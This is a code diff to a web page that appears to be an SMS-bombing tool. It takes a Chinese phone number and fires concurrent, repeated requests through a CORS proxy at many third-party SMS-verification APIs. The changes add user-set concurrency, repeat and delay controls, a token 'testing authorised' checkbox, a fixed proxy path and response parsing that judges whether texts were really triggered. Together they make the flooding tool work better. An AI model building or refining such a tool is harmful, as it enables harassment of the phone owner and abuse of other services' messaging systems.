@@ -93,11 +93,72 @@ button:hover {
     background-color: #ff4757;
 }
 
-#instruction {
-    font-size: 14px;
-    color: #555;
-    margin-top: 20px;
-}
+        #instruction {
+            font-size: 14px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        /* 参数设置区 */
+        .options {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 14px;
+            margin: 4px 0 16px;
+        }
+
+        .options .field {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .options label {
+            font-size: 13px;
+            color: #7d8a9a;
+            letter-spacing: 0.04em;
+        }
+
+        .options input[type="number"] {
+            width: 92px;
+            padding: 8px;
+            font-size: 16px;
+            text-align: center;
+            color: #00ff9d;
+            background-color: #05080c;
+            border: 2px solid #1f7a5a;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .options input[type="number"]:focus {
+            outline: none;
+            border-color: #00ff9d;
+        }
+
+        .confirm {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #7d8a9a;
+            margin-bottom: 14px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .confirm input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #00ff9d;
+            cursor: pointer;
+        }
+
+        .confirm:hover {
+            color: #00ff9d;
+        }
 
 .card {
     background-color: #05080c;
@@ -203,6 +264,10 @@ button:hover {
             font-weight: bold;
         }
         
+        .log-warn {
+            color: #ffd32a;
+        }
+        
         .log-info {
             color: #ffa502;
         }
@@ -257,13 +322,33 @@ button:hover {
         <label for="phoneNumber"></label>
         <input type="text" id="phoneNumber" name="phoneNumber" placeholder="请输入手机号" required><br><br>
 
+        <div class="options">
+            <div class="field">
+                <label for="maxConcurrent">并发数</label>
+                <input type="number" id="maxConcurrent" value="5" min="1" max="30">
+            </div>
+            <div class="field">
+                <label for="repeatCount">每接口重复</label>
+                <input type="number" id="repeatCount" value="1" min="1" max="10">
+            </div>
+            <div class="field">
+                <label for="requestDelay">间隔 (ms)</label>
+                <input type="number" id="requestDelay" value="200" min="0" max="5000" step="50">
+            </div>
+        </div>
+
+        <label class="confirm" for="authorized">
+            <input type="checkbox" id="authorized">
+            <span>我确认对该号码拥有测试授权</span>
+        </label><br>
+
         <button type="button" id="sendBtn" class="btn-start" onclick="sendRequests()">📣 开始发送</button>
         <button type="button" id="stopBtn" class="btn-stop" onclick="stopRequests()">⏹️ 停止发送</button>
     </form>
     
     <div class="log" id="smsLogArea">
         <span class="log-system">⚙️ 系统就绪</span><br>
-        <span class="log-info">📌 请输入手机号并点击发送</span>
+        <span class="log-info">📌 请输入手机号并点击发送</span><br>
     </div>
   
 <div class="card">
@@ -3376,10 +3461,13 @@ button:hover {
         const USE_CORS_PROXY = true; // 设置为true启用CORS代理
         
         // 多个代理备选列表（自动切换）
-        // ⭐ 优先使用当前站点的本地代理，其次是自定义域名代理
+        // ⚠️ 必须用 '/proxy' 而不是 '/'：根路径 '/' 会命中静态资源 index.html，
+        //    Cloudflare Pages 会直接返回静态文件，函数根本不会被执行，代理必然失效。
+        //    '_headers' 中已有针对 '/proxy' 的 no-cache 规则，与此设计一致。
         const CORS_PROXIES = [
-            '/',                                                        // ✅ 本地 Page Functions 代理（首选）
-            'https://cf.zk99999.dpdns.org/',                            // ✅ 新增 CF 路由代理（备用）
+            '/proxy',                                                   // ✅ 本地 Page Functions 代理（首选）
+            // ⚠️ 原备用代理 'https://cf.zk99999.dpdns.org/' 已失效（DNS NXDOMAIN），已移除。
+            //    如需备用代理，请在此处填入你自己的 Cloudflare 反代地址，代理格式为 "?url=<encodeURIComponent(目标URL)>"
         ];
         
         let currentProxyIndex = 0; // 当前使用的代理索引
@@ -3461,20 +3549,171 @@ button:hover {
             throw lastError || new Error('所有代理都失败');
         }
 
+        // ================================================================
+        // 业务结果判定
+        // ================================================================
+        // 只用 HTTP 200 判定「成功」是不诚实的：大量接口会返回
+        //   {"code": 500, "msg": "发送过于频繁"}   ← HTTP 200 但业务失败
+        // 或者干脆返回一个 HTML 错误页。
+        // 这里解析响应体，把结果分成三态：
+        //   sent    已触发 —— 接口明确表示请求已被受理
+        //   failed  失败   —— 接口明确表示失败，或 HTTP 状态码非 2xx
+        //   unknown 未确认 —— HTTP 2xx，但响应里没有任何可识别的业务信号
+        // ================================================================
+
+        const BUSINESS_SUCCESS_CODES = new Set(['0', '200', '00000', '0.0', 'success', 'ok', 'true']);
+        const SUCCESS_KEYWORDS = /(发送成功|已发送|发送完毕|提交成功|请求成功|验证码已|success|sent successfully)/i;
+        const FAILURE_KEYWORDS = /(失败|错误|无效|异常|频繁|过多|超限|超出|限制|已被|已存在|不允许|禁止|冻结|error|invalid|too many|limit|exceed|denied|blocked)/i;
+
+        const CODE_KEYS = ['code', 'status', 'statusCode', 'errorCode', 'errno', 'errcode', 'ret', 'retCode', 'result'];
+        const MESSAGE_KEYS = ['msg', 'message', 'errorMsg', 'errmsg', 'error', 'desc', 'description', 'info', 'tip'];
+
+        function truncate(text, max = 40) {
+            const s = String(text).replace(/\s+/g, ' ').trim();
+            return s.length > max ? s.slice(0, max) + '…' : s;
+        }
+
+        // 从对象里取业务码（支持 data / result 一层嵌套）
+        function pickCode(obj) {
+            const candidates = [obj];
+            for (const key of ['data', 'result']) {
+                if (obj[key] && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
+                    candidates.push(obj[key]);
+                }
+            }
+            for (const scope of candidates) {
+                for (const k of CODE_KEYS) {
+                    const v = scope[k];
+                    if (v !== undefined && v !== null && typeof v !== 'object') {
+                        return v;
+                    }
+                }
+            }
+            return null;
+        }
+
+        // 从对象里取提示信息
+        function pickMessage(obj) {
+            const candidates = [obj];
+            for (const key of ['data', 'result']) {
+                if (obj[key] && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
+                    candidates.push(obj[key]);
+                }
+            }
+            for (const scope of candidates) {
+                for (const k of MESSAGE_KEYS) {
+                    const v = scope[k];
+                    if (typeof v === 'string' && v.trim()) {
+                        return truncate(v.trim());
+                    }
+                }
+            }
+            return '';
+        }
+
+        /**
+         * 判定一次请求的真实结果
+         * @returns {{ state: 'sent'|'failed'|'unknown', reason: string }}
+         */
+        function classifyResponse(status, contentType, bodyText) {
+            // 1) HTTP 层直接判定
+            if (status < 200 || status >= 300) {
+                const httpReasons = {
+                    400: '参数错误', 401: '需要鉴权', 403: '接口拒绝', 404: '接口不存在',
+                    405: '方法不允许', 408: '请求超时', 429: '请求过快',
+                    500: '服务器错误', 502: '服务器错误', 503: '服务器错误', 504: '网关超时',
+                };
+                return { state: 'failed', reason: httpReasons[status] || `状态码${status}` };
+            }
+
+            const text = bodyText || '';
+
+            // 2) 命中本站首页 → 代理根本没生效
+            if (text.includes('Safety box') && text.includes('攻击系统')) {
+                return { state: 'failed', reason: '代理异常（返回的是本站首页）' };
+            }
+
+            const trimmed = text.trim();
+            if (!trimmed) {
+                return { state: 'unknown', reason: '空响应' };
+            }
+
+            // 3) 尝试解析 JSON
+            let payload = null;
+            if (contentType.includes('json') || trimmed.startsWith('{') || trimmed.startsWith('[')) {
+                try {
+                    payload = JSON.parse(trimmed);
+                } catch (e) {
+                    payload = null;
+                }
+            }
+
+            if (payload && typeof payload === 'object') {
+                const obj = Array.isArray(payload) ? (payload[0] || {}) : payload;
+
+                // 3.1 显式布尔标志最可靠
+                for (const key of ['success', 'status', 'ok']) {
+                    if (typeof obj[key] === 'boolean') {
+                        return obj[key]
+                            ? { state: 'sent', reason: `接口返回 ${key}=true` }
+                            : { state: 'failed', reason: pickMessage(obj) || `接口返回 ${key}=false` };
+                    }
+                }
+
+                const message = pickMessage(obj);
+                const code = pickCode(obj);
+
+                // 3.2 有提示信息时，提示语比业务码更好判断
+                if (message) {
+                    if (FAILURE_KEYWORDS.test(message)) {
+                        return { state: 'failed', reason: message };
+                    }
+                    if (SUCCESS_KEYWORDS.test(message)) {
+                        return { state: 'sent', reason: message };
+                    }
+                }
+
+                // 3.3 没有提示语，退回业务码
+                if (code !== null) {
+                    if (BUSINESS_SUCCESS_CODES.has(String(code).toLowerCase())) {
+                        return { state: 'sent', reason: `业务码 ${code}` };
+                    }
+                    return { state: 'failed', reason: `业务码 ${code}` };
+                }
+            }
+
+            // 4) 纯文本兜底
+            if (SUCCESS_KEYWORDS.test(trimmed)) {
+                return { state: 'sent', reason: '响应含成功标识' };
+            }
+            if (FAILURE_KEYWORDS.test(trimmed)) {
+                return { state: 'failed', reason: truncate(trimmed) };
+            }
+
+            // 5) HTML 页面 —— 多半是目标站的错误页 / SPA，无法判断
+            if (contentType.includes('text/html')) {
+                return { state: 'unknown', reason: '返回HTML页面，无法确认' };
+            }
+
+            return { state: 'unknown', reason: '响应无业务标识' };
+        }
+
        // 全局停止控制标志
         let isRunning = false;
         
-        // 全局统计计数器
-        let globalSuccessCount = 0;
-        let globalFailureCount = 0;
+        // 全局统计计数器（三态）
+        let globalSentCount = 0;      // 已触发
+        let globalUnknownCount = 0;   // 未确认
+        let globalFailedCount = 0;    // 失败
         
         // ⭐ 连续失败计数器（用于自动停止）
         let consecutiveFailures = 0;
         const MAX_CONSECUTIVE_FAILURES = 20; // 连续失败20次后自动停止
         
         // 并发控制配置（防止请求堵塞）
-        const MAX_CONCURRENT = 30; // 最大并发数（已优化：10→30）⚡
-        const REQUEST_DELAY = 10; // 每批请求间隔(ms)（已优化：100ms→10ms）⚡
+        // 并发数 / 请求间隔由页面上的参数框决定，这里是兜底默认值
+        const MAX_CONCURRENT = 5;  // 最大并发数
+        const REQUEST_DELAY = 200; // 每批请求间隔(ms)
         
         // ⭐ 请求去重缓存（避免短时间内重复请求相同URL）
         const requestCache = new Map();
@@ -3488,11 +3727,19 @@ button:hover {
         function sleep(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
+
+        // 读取并限制页面上的数字输入
+        function clampNumber(raw, min, max, fallback) {
+            const value = parseInt(raw, 10);
+            if (!Number.isFinite(value)) return fallback;
+            return Math.min(max, Math.max(min, value));
+        }
         
         // 并发控制函数
-        async function runWithConcurrency(tasks, maxConcurrent) {
+        async function runWithConcurrency(tasks, maxConcurrent, batchDelay = 0) {
             const results = [];
             const executing = [];
+            let launched = 0;
             
             for (const task of tasks) {
                 const promise = task().then(result => {
@@ -3502,9 +3749,15 @@ button:hover {
                 
                 results.push(promise);
                 executing.push(promise);
+                launched++;
                 
                 if (executing.length >= maxConcurrent) {
                     await Promise.race(executing);
+
+                    // 每一轮跑满后按设置的间隔歇一下，避免把对方接口打爆
+                    if (batchDelay > 0 && launched < tasks.length) {
+                        await sleep(batchDelay);
+                    }
                 }
             }
             
@@ -3528,6 +3781,9 @@ button:hover {
                     break;
                 case 'error':
                     icon = '❌';
+                    break;
+                case 'warn':
+                    icon = '❓';
                     break;
                 case 'info':
                     icon = '📌';
@@ -3573,9 +3829,20 @@ button:hover {
     const times = 1;
 
     if (!phoneNumber || !/^[1][3-9][0-9]{9}$/.test(phoneNumber)) {
-    addLog('错误：请输入正确的11位中国手机号！', 'error');
-    return;
+        addLog('错误：请输入正确的11位中国手机号！', 'error');
+        return;
     }
+
+    // 授权确认
+    if (!document.getElementById('authorized').checked) {
+        addLog('请先勾选「我确认对该号码拥有测试授权」', 'error');
+        return;
+    }
+
+    // 从页面读取运行参数
+    const maxConcurrent = clampNumber(document.getElementById('maxConcurrent').value, 1, 30, MAX_CONCURRENT);
+    const repeatCount = clampNumber(document.getElementById('repeatCount').value, 1, 10, 1);
+    const requestDelay = clampNumber(document.getElementById('requestDelay').value, 0, 5000, REQUEST_DELAY);
     
     // 清空之前的请求缓存（新的发送任务开始时）
     requestCache.clear();
@@ -3584,12 +3851,14 @@ button:hover {
     isRunning = true;
     
     // 重置全局计数器
-    globalSuccessCount = 0;
-    globalFailureCount = 0;
+    globalSentCount = 0;
+    globalUnknownCount = 0;
+    globalFailedCount = 0;
     consecutiveFailures = 0; // 重置连续失败计数器
 
-    let successCount = 0;
-    let failureCount = 0;
+    let sentCount = 0;      // 已触发
+    let unknownCount = 0;   // 未确认
+    let failedCount = 0;    // 失败
     let totalRequests = 0;
     let completedRequests = 0;
     
@@ -3599,7 +3868,7 @@ button:hover {
     console.log('🚀 开始发送请求...');
     console.log(`📱 手机号: ${phoneNumber}`);
     console.log(`🔢 攻击次数: ${times}`);
-    console.log(`⚙️  并发控制: 最大${MAX_CONCURRENT}个并发`);
+    console.log(`⚙️  并发控制: 最大${maxConcurrent}个并发，间隔 ${requestDelay}ms，每接口重复 ${repeatCount}次`);
     console.log('─'.repeat(60));
     
     // 按钮状态切换（绿色开始 → 红色停止）
@@ -3610,8 +3879,8 @@ button:hover {
 
     const requestTasks = [];
     
-    // ⚡ 循环次数配置（提高成功率和发送频率）
-    const REPEAT_COUNT = 3; // 每个接口执行3次
+    // 每个接口执行的次数
+    const REPEAT_COUNT = repeatCount;
 
     for (let i = 0; i < times; i++) {
         // ⚡ 让每个接口循环执行多次
@@ -3685,75 +3954,62 @@ button:hover {
                     statusStats[status] = (statusStats[status] || 0) + 1;
                     
                     const duration = Date.now() - startTime;
-                    
-                    // ⭐ 验证响应是否真正成功
+
+                    // ⭐ 读取响应体，做业务层判定（sent / failed / unknown）
                     const contentType = response.headers.get('content-type') || '';
-                    const isHtmlResponse = contentType.includes('text/html');
-                    
-                    // 判断失败原因
-                    let failReason = '';
-                    let isRealSuccess = response.ok;
-                    
-                    // 只有 200 返回 HTML 才检测是否是代理问题
-                    if (response.ok && isHtmlResponse) {
-                        try {
-                            const text = await response.clone().text();
-                            if (text.includes('Safety box') || (text.includes('<!DOCTYPE html>') && text.includes('服务器内部接口'))) {
-                                isRealSuccess = false;
-                                failReason = '代理异常';
-                                console.warn(`⚠️ 代理返回了HTML页面而非API响应: ${actualUrl}`);
-                            }
-                        } catch (e) {}
-                    } else if (!response.ok) {
-                        // 非200状态码，根据状态码判断原因
-                        if (status === 404) {
-                            failReason = '接口不存在';
-                        } else if (status === 403) {
-                            failReason = '接口拒绝';
-                        } else if (status === 500 || status === 502 || status === 503) {
-                            failReason = '服务器错误';
-                        } else if (status === 429) {
-                            failReason = '请求过快';
-                        } else {
-                            failReason = `状态码${status}`;
-                        }
+                    let bodyText = '';
+                    try {
+                        bodyText = await response.clone().text();
+                    } catch (e) {
+                        bodyText = '';
                     }
-                    
-                    if (isRealSuccess) {
-                        successCount++;
-                        globalSuccessCount++;
+
+                    const verdict = classifyResponse(status, contentType, bodyText);
+                    const failReason = verdict.reason;
+
+                    if (verdict.state === 'sent') {
+                        sentCount++;
+                        globalSentCount++;
                         consecutiveFailures = 0;
-                        console.log(`✅ [${status}] ${apiRequest.method || 'POST'} 成功 (${duration}ms): ${actualUrl}`);
-                        addLog(`✅ 成功 #${globalSuccessCount} (${duration}ms)`, 'success');
+                        console.log(`✅ [${status}] ${apiRequest.method || 'POST'} 已触发 (${duration}ms) ${failReason}: ${actualUrl}`);
+                        addLog(`已触发 #${globalSentCount} · ${failReason} (${duration}ms)`, 'success');
+                    } else if (verdict.state === 'unknown') {
+                        unknownCount++;
+                        globalUnknownCount++;
+                        // 未确认不等于失败，不计入连续失败计数
+                        console.warn(`❓ [${status}] ${apiRequest.method || 'POST'} 未确认 (${duration}ms) ${failReason}: ${actualUrl}`);
+                        if (globalUnknownCount <= 5 || globalUnknownCount % 20 === 0) {
+                            addLog(`未确认 · ${failReason} (${duration}ms)`, 'warn');
+                        }
                     } else {
-                        failureCount++;
-                        globalFailureCount++;
+                        failedCount++;
+                        globalFailedCount++;
                         consecutiveFailures++;
-                        console.warn(`⚠️  [${status}] ${apiRequest.method || 'POST'} 失败(${failReason}) (${duration}ms): ${actualUrl}`);
+                        console.warn(`❌ [${status}] ${apiRequest.method || 'POST'} 失败(${failReason}) (${duration}ms): ${actualUrl}`);
                         
                         // 显示部分失败日志（前5个 + 每20个显示一次）
-                        if (globalFailureCount <= 5 || globalFailureCount % 20 === 0) {
-                            addLog(`❌ ${failReason} (${duration}ms)`, 'error');
+                        if (globalFailedCount <= 5 || globalFailedCount % 20 === 0) {
+                            addLog(`${failReason} (${duration}ms)`, 'error');
                         }
                         
                         // ⭐ 连续失败过多，自动停止
                         if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES && isRunning) {
                             isRunning = false;
                             addLog(`⚠️ 连续失败${consecutiveFailures}次，已自动停止`, 'error');
-                            addLog(`💡 可能是代理额度超限，请明天再试`, 'info');
+                            addLog('💡 可能是代理额度超限，请明天再试', 'info');
                             console.error(`🛑 连续失败${consecutiveFailures}次，自动停止发送`);
                         }
                     }
                     
-                    // 每10个成功请求显示一次进度
-                    if (successCount > 0 && successCount % 10 === 0) {
-                        console.log(`📊 进度: ${completedRequests}/${totalRequests} | 成功: ${successCount} | 失败: ${failureCount}`);
-                        addLog(`✅ 已成功: ${successCount} 个`, 'success');
+                    // 每10个已触发显示一次进度
+                    if (sentCount > 0 && sentCount % 10 === 0) {
+                        console.log(`📊 进度: ${completedRequests}/${totalRequests} | 已触发: ${sentCount} | 未确认: ${unknownCount} | 失败: ${failedCount}`);
+                        addLog(`已触发 ${sentCount} · 未确认 ${unknownCount} · 失败 ${failedCount}`, 'system');
                     }
                     
                 } catch (error) {
-                    failureCount++;
-                    globalFailureCount++;
+                    failedCount++;
+                    globalFailedCount++;
                     completedRequests++;
                     const duration = Date.now() - startTime;
                     const displayUrl = typeof apiRequest.url === 'function' ? 'Dynamic URL' : apiRequest.url;
@@ -3769,11 +4025,11 @@ button:hover {
 
     // 使用并发控制执行所有请求
     console.log(`\n📦 总共创建 ${totalRequests} 个请求任务`);
-    console.log(`⚙️  使用 ${MAX_CONCURRENT} 个并发执行\n`);
+    console.log(`⚙️  使用 ${maxConcurrent} 个并发执行\n`);
     
     const startTime = Date.now();
     
-    await runWithConcurrency(requestTasks, MAX_CONCURRENT);
+    await runWithConcurrency(requestTasks, maxConcurrent, requestDelay);
     
     const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
     
@@ -3783,8 +4039,9 @@ button:hover {
     console.log('═'.repeat(60));
     console.log(`⏱️  总耗时: ${totalTime}秒`);
     console.log(`📦 总请求: ${totalRequests}个`);
-    console.log(`✅ 成功: ${successCount}个 (${(successCount/totalRequests*100).toFixed(1)}%)`);
-    console.log(`❌ 失败: ${failureCount}个 (${(failureCount/totalRequests*100).toFixed(1)}%)`);
+    console.log(`✅ 已触发: ${sentCount}个 (${(sentCount/totalRequests*100).toFixed(1)}%)`);
+    console.log(`❓ 未确认: ${unknownCount}个 (${(unknownCount/totalRequests*100).toFixed(1)}%)`);
+    console.log(`❌ 失败: ${failedCount}个 (${(failedCount/totalRequests*100).toFixed(1)}%)`);
     console.log('\n📈 状态码分布:');
     
     // 按状态码排序并显示
@@ -3813,21 +4070,27 @@ button:hover {
         addLog(`⏹️ 已停止发送`, 'system');
     }
     
-    // 计算成功率
-    const successRate = totalRequests > 0 ? ((successCount / totalRequests) * 100).toFixed(1) : 0;
+    // 计算占比
+    const pct = (n) => totalRequests > 0 ? ((n / totalRequests) * 100).toFixed(1) : '0.0';
     
     // 显示完整统计
-    if (successCount > 0) {
-        addLog(`✅ 成功: ${successCount} 个 (${successRate}%)`, 'success');
+    if (sentCount > 0) {
+        addLog(`已触发: ${sentCount} 个 (${pct(sentCount)}%)`, 'success');
     }
-    if (failureCount > 0) {
-        addLog(`❌ 失败: ${failureCount} 个`, 'error');
+    if (unknownCount > 0) {
+        addLog(`未确认: ${unknownCount} 个 (${pct(unknownCount)}%)`, 'warn');
+    }
+    if (failedCount > 0) {
+        addLog(`失败: ${failedCount} 个 (${pct(failedCount)}%)`, 'error');
     }
     addLog(`⏱️ 耗时: ${totalTime}秒`, 'info');
     
-    // 如果大量失败，提示代理问题
-    if (failureCount > successCount * 2) {
-        addLog(`⚠️ 大量请求失败，请检查代理配置`, 'error');
+    // 给出结论性提示
+    if (failedCount > 0 && failedCount > (sentCount + unknownCount) * 2) {
+        addLog('⚠️ 大量请求失败，优先检查代理配置与接口可达性', 'error');
+    }
+    if (sentCount === 0 && unknownCount > 0) {
+        addLog('💡 全部为「未确认」：请求已送达但接口没给出明确业务标识，实际是否发送短信无法判定', 'info');
     }
     addLog('─'.repeat(30), 'system');
 }
